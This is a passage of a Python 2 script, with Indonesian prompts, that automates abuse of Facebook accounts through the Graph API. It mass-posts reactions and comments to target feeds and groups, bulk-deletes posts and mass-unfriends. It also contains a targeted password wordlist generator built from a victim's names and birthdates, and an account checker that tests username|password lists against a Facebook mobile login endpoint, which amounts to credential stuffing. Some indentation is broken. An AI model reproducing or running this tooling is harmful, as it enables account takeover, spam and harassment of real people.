    os.system('clear')
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    os.system('clear')
    print logo
    ide = raw_input('\x1b[1;91m[+] \x1b[1;92mMasukan ID Target \x1b[1;91m:\x1b[1;97m ')
    limit = raw_input('\x1b[1;91m[!] \x1b[1;92mLimit \x1b[1;91m:\x1b[1;97m ')
    
    try:
        oh = requests.get('https://graph.facebook.com/' + ide + '?fields=feed.limit(' + limit + ')&access_token=' + toket)
        ah = json.loads(oh.text)
        jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mStart \x1b[1;97m...')
        print 42 * '\x1b[1;97m\xe2\x95\x90'
        for a in ah['feed']['data']:
            y = a['id']
            reaksi.append(y)
            requests.post('https://graph.facebook.com/' + y + '/reactions?type=' + tipe + '&access_token=' + toket)
            print '\x1b[1;92m[\x1b[1;97m' + y[:10].replace('\n', ' ') + '... \x1b[1;92m] \x1b[1;97m' + tipe
        
        print 42 * '\x1b[1;97m\xe2\x95\x90'
        print '\r\x1b[1;91m[+]\x1b[1;92m Done \x1b[1;97m' + str(len(reaksi))
        raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
        menu_bot()
    except KeyError:
        print '\x1b[1;91m[!] ID tidak ada'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
        menu_bot()



def grup_react():
    os.system('clear')
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    os.system('clear')
    print logo
    print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[1;91m{\x1b[1;94m01\x1b[1;91m} \x1b[1;97mLike'
    print '\x1b[1;91m{\x1b[1;94m02\x1b[1;91m} \x1b[1;97mLove'
    print '\x1b[1;91m{\x1b[1;94m03\x1b[1;91m} \x1b[1;97mWow'
    print '\x1b[1;91m{\x1b[1;94m04\x1b[1;91m} \x1b[1;97mHaha'
    print '\x1b[1;91m{\x1b[1;94m05\x1b[1;91m} \x1b[1;97mSadBoy'
    print '\x1b[1;91m{\x1b[1;94m06\x1b[1;91m} \x1b[1;97mAngry'
    print '\x1b[1;91m{\x1b[1;94m00\x1b[1;91m} \x1b[1;97m Keluar'
    print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    reactg_pilih()


def reactg_pilih():
    global tipe
    aksi = raw_input('\x1b[1;97m\xe2\x95\x9a\xe2\x95\x90\x1b[1;91mD \x1b[1;97m')
    if aksi == '':
        print '\x1b[1;91m[!] Salah'
        reactg_pilih()
    elif aksi == '1':
        tipe = 'LIKE'
        reactg()
    elif aksi == '2':
        tipe = 'LOVE'
        reactg()
    elif aksi == '3':
        tipe = 'WOW'
        reactg()
    elif aksi == '4':
        tipe = 'HAHA'
        reactg()
    elif aksi == '5':
        tipe = 'SAD'
        reactg()
    elif aksi == '6':
        tipe = 'ANGRY'
        reactg()
    elif aksi == '0':
        menu_bot()
    else:
        print '\x1b[1;91m[!] Salah'
        reactg_pilih()


def reactg():
    os.system('clear')
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    os.system('clear')
    print logo
    ide = raw_input('\x1b[1;91m[+] \x1b[1;92mMasukan ID Group \x1b[1;91m:\x1b[1;97m ')
    limit = raw_input('\x1b[1;91m[!] \x1b[1;92mLimit \x1b[1;91m:\x1b[1;97m ')
    
    try:
        r = requests.get('https://graph.facebook.com/group/?id=' + ide + '&access_token=' + toket)
        asw = json.loads(r.text)
        print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mFrom group \x1b[1;91m:\x1b[1;97m ' + asw['name']
    except KeyError:
        print '\x1b[1;91m[!] ID Group tidak ada'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
        grup_react()

    
    try:
        oh = requests.get('https://graph.facebook.com/v3.0/' + ide + '?fields=feed.limit(' + limit + ')&access_token=' + toket)
        ah = json.loads(oh.text)
        jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mStart \x1b[1;97m...')
        print 42 * '\x1b[1;97m\xe2\x95\x90'
        for a in ah['feed']['data']:
            y = a['id']
            reaksigrup.append(y)
            requests.post('https://graph.facebook.com/' + y + '/reactions?type=' + tipe + '&access_token=' + toket)
            print '\x1b[1;92m[\x1b[1;97m' + y[:10].replace('\n', ' ') + '... \x1b[1;92m] \x1b[1;97m' + tipe
        
        print 42 * '\x1b[1;97m\xe2\x95\x90'
        print '\r\x1b[1;91m[+]\x1b[1;92m Done \x1b[1;97m' + str(len(reaksigrup))
        raw_input('\n\x1b[1;91m[ \x1b[1;97mkKeluar \x1b[1;91m]')
        menu_bot()
    except KeyError:
        print '\x1b[1;91m[!] ID tidak aka'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
        menu_bot()



def bot_komen():
    os.system('clear')
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    os.system('clear')
    print logo
    print "\x1b[1;91m[!] \x1b[1;93mGunakan \x1b[1;97m'<>' \x1b[1;92muntuk baris baru"
    ide = raw_input('\x1b[1;91m[+] \x1b[1;92mID  \x1b[1;91m: \x1b[1;97m ')
    km = raw_input('\x1b[1;91m[+] \x1b[1;92mComent \x1b[1;91m: \x1b[1;97m ')
    limit = raw_input('\x1b[1;91m[!] \x1b[1;92mLimit \x1b[1;91m: \x1b[1;97m ')
    km = km.replace('<>', '\n')
    
    try:
        p = requests.get('https://graph.facebook.com/' + ide + '?fields=feed.limit(' + limit + ')&access_token=' + toket)
        a = json.loads(p.text)
        jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mStart \x1b[1;97m...')
        print 42 * '\x1b[1;97m\xe2\x95\x90'
        for s in a['feed']['data']:
            f = s['id']
            komen.append(f)
            requests.post('https://graph.facebook.com/' + f + '/comments?message=' + km + '&access_token=' + toket)
            print '\x1b[1;92m[\x1b[1;97m' + km[:10].replace('\n', ' ') + '... \x1b[1;92m]'
        
        print 42 * '\x1b[1;97m\xe2\x95\x90'
        print '\r\x1b[1;91m[+]\x1b[1;92m Done \x1b[1;97m' + str(len(komen))
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        menu_bot()
    except KeyError:
        print '\x1b[1;91mTidak ada'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar\x1b[1;91m]')
        menu_bot()



def grup_komen():
    os.system('clear')
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    os.system('clear')
    print logo
    print "\x1b[1;91m[!] \x1b[1;92mGunakan \x1b[1;97m'<>' \x1b[1;92muntuk baris baru"
    ide = raw_input('\x1b[1;91m[+] \x1b[1;92mID Group  \x1b[1;91m:\x1b[1;97m ')
    km = raw_input('\x1b[1;91m[+] \x1b[1;92mComment \x1b[1;91m:\x1b[1;97m ')
    limit = raw_input('\x1b[1;91m[!] \x1b[1;92mLimit \x1b[1;91m:\x1b[1;97m ')
    km = km.replace('<>', '\n')
    
    try:
        r = requests.get('https://graph.facebook.com/group/?id=' + ide + '&access_token=' + toket)
        asw = json.loads(r.text)
        print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mFrom group \x1b[1;91m:\x1b[1;97m ' + asw['name']
    except KeyError:
        print '\x1b[1;91m[!] Group not found'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        menu_bot()

    
    try:
        p = requests.get('https://graph.facebook.com/v3.0/' + ide + '?fields=feed.limit(' + limit + ')&access_token=' + toket)
        a = json.loads(p.text)
        jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mStart \x1b[1;97m...')
        print 42 * '\x1b[1;97m\xe2\x95\x90'
        for s in a['feed']['data']:
            f = s['id']
            komengrup.append(f)
            requests.post('https://graph.facebook.com/' + f + '/comments?message=' + km + '&access_token=' + toket)
            print '\x1b[1;92m[\x1b[1;97m' + km[:10].replace('\n', ' ') + '... \x1b[1;92m]'
        
        print 42 * '\x1b[1;97m\xe2\x95\x90'
        print '\r\x1b[1;91m[+]\x1b[1;92m Done \x1b[1;97m' + str(len(komengrup))
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        menu_bot()
    except KeyError:
        print '\x1b[1;91m[!] Error'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        menu_bot()



def deletepost():
    os.system('clear')
    
    try:
        toket = open('login.txt', 'r').read()
        nam = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        lol = json.loads(nam.text)
        nama = lol['name']
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    os.system('clear')
    print logo
    print '\x1b[1;91m[+] \x1b[1;92mFrom \x1b[1;91m: \x1b[1;97m%s' % nama
    jalan('\x1b[1;91m[+] \x1b[1;92mStart\x1b[1;97m ...')
    print 42 * '\x1b[1;97m\xe2\x95\x90'
    asu = requests.get('https://graph.facebook.com/me/feed?access_token=' + toket)
    asus = json.loads(asu.text)
    for p in asus['data']:
        id = p['id']
        piro = 0
        url = requests.get('https://graph.facebook.com/' + id + '?method=delete&access_token=' + toket)
        ok = json.loads(url.text)
        
        try:
            error = ok['error']['message']
            print '\x1b[1;91m[\x1b[1;97m' + id[:10].replace('\n', ' ') + '...' + '\x1b[1;91m] \x1b[1;95mFailed'
        continue
        except TypeError:
            print '\x1b[1;92m[\x1b[1;97m' + id[:10].replace('\n', ' ') + '...' + '\x1b[1;92m] \x1b[1;96mDeleted'
            piro += 1
            continue
            except requests.exceptions.ConnectionError:
                print '\x1b[1;91m[!] Connection Error'
                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                menu_bot()
                continue
            
        print 42 * '\x1b[1;97m\xe2\x95\x90'
        print '\x1b[1;91m[+] \x1b[1;92mDone'
        menu_bot()
        return None



def accept():
    os.system('clear')
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    os.system('clear')
    print logo
    limit = raw_input('\x1b[1;91m[!] \x1b[1;92mLimit \x1b[1;91m:\x1b[1;97m ')
    r = requests.get('https://graph.facebook.com/me/friendrequests?limit=' + limit + '&access_token=' + toket)
    teman = json.loads(r.text)
    if '[]' in str(teman['data']):
        print '\x1b[1;91m[!] No friend request'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        menu_bot()
    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mStart \x1b[1;97m...')
    print 42 * '\x1b[1;97m\xe2\x95\x90'
    for i in teman['data']:
        gas = requests.post('https://graph.facebook.com/me/friends/' + i['from']['id'] + '?access_token=' + toket)
        a = json.loads(gas.text)
        if 'error' in str(a):
            print '\x1b[1;97m[ \x1b[1;91mFailed\x1b[1;97m ] ' + i['from']['name']
            continue
        print '\x1b[1;97m[ \x1b[1;92mAccept\x1b[1;97m ] ' + i['from']['name']
    
    print 42 * '\x1b[1;97m\xe2\x95\x90'
    print '\x1b[1;91m[+] \x1b[1;92mDone'
    raw_input('\n\x1b[1;91m[ \x1b[1;97makeluar \x1b[1;91m]')
    menu_bot()


def unfriend():
    os.system('clear')
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    os.system('clear')
    print logo
    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mStart \x1b[1;97m...')
    print '\x1b[1;97mStop \x1b[1;91mCTRL+C'
    print 42 * '\x1b[1;97m\xe2\x95\x90'
    
    try:
        pek = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
        cok = json.loads(pek.text)
        for i in cok['data']:
            nama = i['name']
            id = i['id']
            requests.delete('https://graph.facebook.com/me/friends?uid=' + id + '&access_token=' + toket)
            print '\x1b[1;97m[\x1b[1;92m Deleted \x1b[1;97m] ' + nama
    except IndexError:
        pass
    except KeyboardInterrupt:
        print '\x1b[1;91m[!] Stopped'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        menu_bot()

    print '\n\x1b[1;91m[+] \x1b[1;92mDone'
    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
    menu_bot()


def lain():
    os.system('clear')
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    os.system('clear')
    print logo
    print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[1;97m{\x1b[1;91m01\x1b[1;97m}\x1b[1;93m Buat Post'
    print '\x1b[1;97m{\x1b[1;91m02\x1b[1;97m}\x1b[1;93m Buat Wordlist'
    print '\x1b[1;97m{\x1b[1;91m03\x1b[1;97m}\x1b[1;93m Account Checker'
    print '\x1b[1;97m{\x1b[1;91m04\x1b[1;97m}\x1b[1;93m See my group list'
    print '\x1b[1;97m{\x1b[1;91m05\x1b[1;97m}\x1b[1;93m Profile Guard'
    print '\x1b[1;97m{\x1b[1;91m00\x1b[1;97m}\x1b[1;93m Keluar'
    print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    pilih_lain()


def pilih_lain():
    other = raw_input('\x1b[1;97m\xe2\x95\x9a\xe2\x95\x90\x1b[1;91mD \x1b[1;97m')
    if other == '':
        print '\x1b[1;91m[!] salah'
        pilih_lain()
    elif other == '1':
        status()
    elif other == '2':
        wordlist()
    elif other == '3':
        check_akun()
    elif other == '4':
        grupsaya()
    elif other == '5':
        guard()
    elif other == '0':
        menu()
    else:
        print '\x1b[1;91m[!] salah'
        pilih_lain()


def status():
    os.system('clear')
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    os.system('clear')
    print logo
    msg = raw_input('\x1b[1;91m[+] \x1b[1;92mType status \x1b[1;91m:\x1b[1;97m ')
    if msg == '':
        print '\x1b[1;91m[!] tidak bolh kosong'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
        lain()
    else:
        res = requests.get('https://graph.facebook.com/me/feed?method=POST&message=' + msg + '&access_token=' + toket)
        op = json.loads(res.text)
        jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mCreate \x1b[1;97m...')
        print 42 * '\x1b[1;97m\xe2\x95\x90'
        print '\x1b[1;91m[+] \x1b[1;92mStatus ID\x1b[1;91m : \x1b[1;97m' + op['id']
        raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
        lain()


def wordlist():
    os.system('clear')
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    
    try:
        os.system('clear')
        print logo
        print '\x1b[1;91m[?] \x1b[1;92mIsikan data lengkap target di bawah ini'
        print 42 * '\x1b[1;97m\xe2\x95\x90'
        a = raw_input('\x1b[1;91m[+] \x1b[1;92mNama Depan \x1b[1;97m: ')
        file = open(a + '.txt', 'w')
        b = raw_input('\x1b[1;91m[+] \x1b[1;92mNama Tengah \x1b[1;97m: ')
        c = raw_input('\x1b[1;91m[+] \x1b[1;92mNama Belakang \x1b[1;97m: ')
        d = raw_input('\x1b[1;91m[+] \x1b[1;92mNama Panggilan \x1b[1;97m: ')
        e = raw_input('\x1b[1;91m[+] \x1b[1;92mTanggal Lahir >\x1b[1;96mex: |XNXX| \x1b[1;97m: ')
        f = e[0:2]
        g = e[2:4]
        h = e[4:]
        print 42 * '\x1b[1;97m\xe2\x95\x90'
        print '\x1b[1;91m[?] \x1b[1;93mKalo Jomblo SKIP aja :v'
        i = raw_input('\x1b[1;91m[+] \x1b[1;92mNama Pacar \x1b[1;97m: ')
        j = raw_input('\x1b[1;91m[+] \x1b[1;92mNama Panggilan Pacar \x1b[1;97m: ')
        k = raw_input('\x1b[1;91m[+] \x1b[1;92mTanggal Lahir Pacar >\x1b[1;96mex: |XNXX| \x1b[1;97m: ')
        jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mCreate \x1b[1;97m...')
        l = k[0:2]
        m = k[2:4]
        n = k[4:]
        file.write('%s%s\n%s%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s%s\n%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s' % (a, c, a, b, b, a, b, c, c, a, c, b, a, a, b, b, c, c, a, d, b, d, c, d, d, d, d, a, d, b, d, c, a, e, a, f, a, g, a, h, b, e, b, f, b, g, b, h, c, e, c, f, c, g, c, h, d, e, d, f, d, g, d, h, e, a, f, a, g, a, h, a, e, b, f, b, g, b, h, b, e, c, f, c, g, c, h, c, e, d, f, d, g, d, h, d, d, d, a, f, g, a, g, h, f, g, f, h, f, f, g, f, g, h, g, g, h, f, h, g, h, h, h, g, f, a, g, h, b, f, g, b, g, h, c, f, g, c, g, h, d, f, g, d, g, h, a, i, a, j, a, k, i, e, i, j, i, k, b, i, b, j, b, k, c, i, c, j, c, k, e, k, j, a, j, b, j, c, j, d, j, j, k, a, k, b, k, c, k, d, k, k, i, l, i, m, i, n, j, l, j, m, j, n, j, k))
        wg = 0
        while wg < 100:
            wg = wg + 1
            file.write(a + str(wg) + '\n')
        en = 0
        while en < 100:
            en = en + 1
            file.write(i + str(en) + '\n')
        word = 0
        while word < 100:
            word = word + 1
            file.write(d + str(word) + '\n')
        gen = 0
        while gen < 100:
            gen = gen + 1
            file.write(j + str(gen) + '\n')
        file.close()
        time.sleep(1.5)
        print 42 * '\x1b[1;97m\xe2\x95\x90'
        print '\x1b[1;91m[+] \x1b[1;92mSaved \x1b[1;91m: \x1b[1;97m %s.txt' % a
        raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
        lain()
    except IOError:
        e = None
        print '\x1b[1;91m[!] Gagal'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar\x1b[1;91m]')
        lain()



def check_akun():
    os.system('clear')
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    os.system('clear')
    print logo
    print '\x1b[1;91m[?] \x1b[1;92mCreate in file\x1b[1;91m : \x1b[1;97musername|password'
    print 42 * '\x1b[1;97m\xe2\x95\x90'
    live = []
    cek = []
    die = []
    
    try:
        file = raw_input('\x1b[1;91m[+] \x1b[1;92mFile \x1b[1;91m:\x1b[1;97m ')
        list = open(file, 'r').readlines()
    except IOError:
        print '\x1b[1;91m[!] File tidak ada'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
        lain()

    pemisah = raw_input('\x1b[1;91m[+] \x1b[1;92mSeparator \x1b[1;91m:\x1b[1;97m ')
    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mStart \x1b[1;97m...')
    print 42 * '\x1b[1;97m\xe2\x95\x90'
    for meki in list:
        (username, password) = meki.strip().split(str(pemisah))
        url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + username + '&locale=en_US&password=' + password + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
        data = requests.get(url)
        mpsh = json.loads(data.text)
        if 'access_token' in mpsh:
            live.append(password)
            print '\x1b[1;97m[ \x1b[1;92mLive\x1b[1;97m ] \x1b[1;97m' + username + '|' + password
            continue
        if 'www.facebook.com' in mpsh['error_msg']:
            cek.append(password)
            print '\x1b[1;97m[ \x1b[1;93mCheck\x1b[1;97m ] \x1b[1;97m' + username + '|' + password
            continue
        die.append(password)
        print '\x1b[1;97m[ \x1b[1;91mDie\x1b[1;97m ] \x1b[1;97m' + username + '|' + password
    
    print 42 * '\x1b[1;97m\xe2\x95\x90'
    print '\x1b[1;91m[+] \x1b[1;92mTotal\x1b[1;91m : \x1b[1;97mLive=\x1b[1;92m' + str(len(live)) + ' \x1b[1;97mCheck=\x1b[1;93m' + str(len(cek)) + ' \x1b[1;97mDie=\x1b[1;91m' + str(len(die))
    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
    lain()


def grupsaya():
    os.system('clear')
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    
    try:
        os.mkdir('out')
    except OSError:
        pass

    os.system('clear')
    print logo
    
    try:
        uh = requests.get('https://graph.facebook.com/me/groups?access_token=' + toket)
        gud = json.loads(uh.text)
        for p in gud['data']:
            nama = p['name']
            id = p['id']
            f = open('out/Grupid.txt', 'w')
            listgrup.append(id)
            f.write(id + '\n')
            print '\x1b[1;97m[ \x1b[1;92mMy Group\x1b[1;97m ] ' + str(id) + ' => ' + str(nama)
        
        print 42 * '\x1b[1;97m\xe2\x95\x90'
        print '\x1b[1;91m[+] \x1b[1;92mTotal Group \x1b[1;91m:\x1b[1;97m %s' % len(listgrup)
        print '\x1b[1;91m[+] \x1b[1;92mSaved \x1b[1;91m: \x1b[1;97mout/Grupid.txt'
        f.close()
        raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
        lain()
    except (KeyboardInterrupt, EOFError):
        print '\x1b[1;91m[!] Berhenti'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
        lain()
    except KeyError:
        os.remove('out/Grupid.txt')
        print '\x1b[1;91m[!] Group tidak ada'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
        lain()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;91m[\xe2\x9c\x96] Tidak ada koneksi'
        keluar()
    except IOError:
        print '\x1b[1;91m[!] Error'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
        lain()



def guard():
    global toket
    os.system('clear')
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    os.system('clear')
    print logo
    print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[1;97m{\x1b[1;94m01\x1b[1;97m}\x1b[1;97m Activate'
    print '\x1b[1;97m{\x1b[1;94m02\x1b[1;97m}\x1b[1;97m Not activate'
    print '\x1b[1;97m{\x1b[1;94m00\x1b[1;97m}\x1b[1;91m Keluar'
